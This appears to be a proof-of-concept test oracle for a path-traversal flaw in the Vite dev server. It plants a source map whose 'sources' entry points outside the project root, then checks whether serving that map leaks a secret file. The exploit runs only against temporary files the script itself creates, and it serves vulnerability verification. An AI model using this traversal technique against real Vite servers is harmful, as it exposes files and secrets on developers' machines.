const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  const marker = 'vite-map-traversal-' + Date.now() + '-' + Math.random().toString(16).slice(2);
  const base = path.join(os.tmpdir(), marker);
  const root = path.join(base, 'project');
  const depsDir = path.join(root, 'node_modules', '.vite', 'deps');

  let server;
  try {
    fs.mkdirSync(depsDir, { recursive: true });
    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body>ok</body></html>');

    const safeMapName = 'safe.js.map';
    const safeMapPath = path.join(depsDir, safeMapName);
    fs.writeFileSync(
      safeMapPath,
      JSON.stringify({ version: 3, file: 'safe.js', sources: ['safe-source.ts'], names: [], mappings: '' })
    );

    const outsideSecret = path.join(base, 'outside-secret-' + marker + '.txt');
    const outsideContent = 'SECRET_' + marker;
    fs.writeFileSync(outsideSecret, outsideContent);

    const relTraversal = path.relative(depsDir, outsideSecret).split(path.sep).join('/');
    const evilMapName = 'evil.js.map';
    fs.writeFileSync(
      path.join(depsDir, evilMapName),
      JSON.stringify({ version: 3, file: 'evil.js', sources: [relTraversal], names: [], mappings: '' })
    );

    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') throw new Error('vite.createServer unavailable');

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'custom',
      server: { middlewareMode: true },
      optimizeDeps: { noDiscovery: true, force: false }
    });

    const request = (url) =>
      new Promise((resolve, reject) => {
        const req = { method: 'GET', url, headers: {} };
        const res = {
          statusCode: 200,
          headers: {},
          body: '',
          setHeader(k, v) {
            this.headers[String(k).toLowerCase()] = v;
          },
          getHeader(k) {
            return this.headers[String(k).toLowerCase()];
          },
          writeHead(code, headers) {
            this.statusCode = code;
            if (headers && typeof headers === 'object') {
              for (const k of Object.keys(headers)) this.setHeader(k, headers[k]);
            }
            return this;
          },
          write(chunk) {
            if (chunk) this.body += String(chunk);
          },
          end(chunk) {
            if (chunk) this.body += String(chunk);
            resolve({ statusCode: this.statusCode || 200, headers: this.headers, body: this.body });
          }
        };

        try {
          server.middlewares.handle(req, res, () => {
            resolve({ statusCode: res.statusCode || 404, headers: res.headers, body: res.body || '' });
          });
        } catch (e) {
          reject(e);
        }
      });

    const benign = await request('/node_modules/.vite/deps/' + safeMapName);
    const benignBody = String((benign && benign.body) || '');
    if (!(benign && benign.statusCode >= 200 && benign.statusCode < 300 && benignBody.includes('safe-source.ts'))) {
      throw new Error('benign optimized map failed: status=' + (benign ? benign.statusCode : 'none') + ' body_len=' + benignBody.length);
    }

    operation_completed = true;

    let malResp;
    let malErr;
    try {
      malResp = await request('/node_modules/.vite/deps/' + evilMapName);
    } catch (e) {
      malErr = e;
    }

    if (malErr) {
      exploit_succeeded = false;
      evidence = 'malicious request threw exception (blocked): ' + (malErr && malErr.message ? malErr.message : String(malErr));
    } else {
      const malBody = String((malResp && malResp.body) || '');
      const leakedSecret = malBody.includes(outsideContent);
      const reflectedTraversal = malBody.includes(relTraversal);
      exploit_succeeded = leakedSecret;
      evidence =
        'benign_status=' + benign.statusCode +
        ', malicious_status=' + (malResp ? malResp.statusCode : 'none') +
        ', leaked_secret=' + leakedSecret +
        ', reflected_traversal=' + reflectedTraversal +
        ', mal_body_len=' + malBody.length;
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup/benign failure: ' + (err && err.message ? err.message : String(err));
  } finally {
    try {
      if (server) await server.close();
    } catch (_) {}
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();